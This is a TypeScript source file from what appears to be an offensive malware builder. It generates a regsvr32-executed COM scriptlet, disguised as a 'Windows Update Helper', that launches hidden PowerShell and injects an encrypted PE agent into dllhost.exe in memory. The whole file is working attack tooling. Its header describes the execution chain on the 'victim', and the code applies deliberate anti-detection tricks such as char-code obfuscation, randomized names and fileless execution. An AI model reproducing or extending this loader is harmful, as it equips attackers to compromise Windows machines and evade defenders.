/**
 * sct-wrapper.ts — Wraps a compiled PE binary in a COM scriptlet (.sct)
 * that injects the agent into dllhost.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * LOLBAS delivery: regsvr32.exe (T1218.010) — signed MS binary.
 * Execution: regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
 *
 * Execution chain on victim:
 *   1. regsvr32.exe loads scrobj.dll and parses the .sct XML
 *   2. JScript in <script> element sets env vars with payload + C# source
 *   3. WScript.Shell launches PowerShell hidden
 *   4. PS decrypts XOR+gzip payload from env var base64 in memory
 *   5. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   6. dllhost.exe started hidden (LOTL — COM Surrogate, always present, low suspicion)
 *   7. PE manually mapped into dllhost via VirtualAllocEx + WriteProcessMemory
 *   8. Relocations + imports resolved remotely
 *   9. CreateRemoteThread at PE entry point
 *  10. Agent runs inside dllhost.exe — no files on disk
 */

import { v4 as uuidv4 } from "uuid";
import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Generate a self-contained .sct file with fileless PE injection.
 * Returns the full SCT content as a string.
 */
export function wrapPeAsSct(peBytes: Buffer): string {
  const encrypted = encryptPayload(peBytes);
  const b64Payload = encrypted.toString("base64");
  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);
  const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

  // PS reads payload + C# from environment variables set by JScript
  const psLines = [
    `$d=[Convert]::FromBase64String($env:_SCT_D)`,
    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_SCT_CS))`,
  ];

  const chain = buildPsInjectionChain("$d", "$cs", className, "dllhost.exe");
  const psScript = psLines.join(";") + ";" + chain;
  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");

  const rnd = randHex(6);
  const classId = uuidv4();
  const progId = `Xp.${randClassName(6)}`;

  // JScript payload — sets env vars and launches PS
  // Split base64 across multiple assignments to stay under script engine limits
  const chunkSize = 4000;
  const payloadChunks = b64Payload.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [b64Payload];
  const csChunks = csB64.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [csB64];

  const jsLines: string[] = [];
  jsLines.push(`var ${rnd}s=new ActiveXObject("WScript.Shell");`);
  jsLines.push(`var ${rnd}e=${rnd}s.Environment("Process");`);

  // Build payload base64
  jsLines.push(`var ${rnd}d="${payloadChunks[0]}";`);
  for (let i = 1; i < payloadChunks.length; i++) {
    jsLines.push(`${rnd}d+="${payloadChunks[i]}";`);
  }
  jsLines.push(`${rnd}e("_SCT_D")=${rnd}d;`);

  // Build C# base64
  jsLines.push(`var ${rnd}c="${csChunks[0]}";`);
  for (let i = 1; i < csChunks.length; i++) {
    jsLines.push(`${rnd}c+="${csChunks[i]}";`);
  }
  jsLines.push(`${rnd}e("_SCT_CS")=${rnd}c;`);

  // Reassemble "powershell" from char codes to avoid static signatures
  jsLines.push(`var ${rnd}p=String.fromCharCode(112,111,119,101,114,115,104,101,108,108);`);

  // Launch PS hidden (0 = hidden window)
  jsLines.push(`${rnd}s.Run(${rnd}p+" -nop -w h -ep b -enc ${psEnc}",0,false);`);

  const jsScript = jsLines.join("\n");

  return `<?XML version="1.0"?>
<scriptlet>
<registration
  description="Windows Update Helper"
  progid="${progId}"
  version="1.00"
  classid="{${classId}}"
>
</registration>
<public>
  <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[
${jsScript}
]]>
</script>
</scriptlet>
`;
}
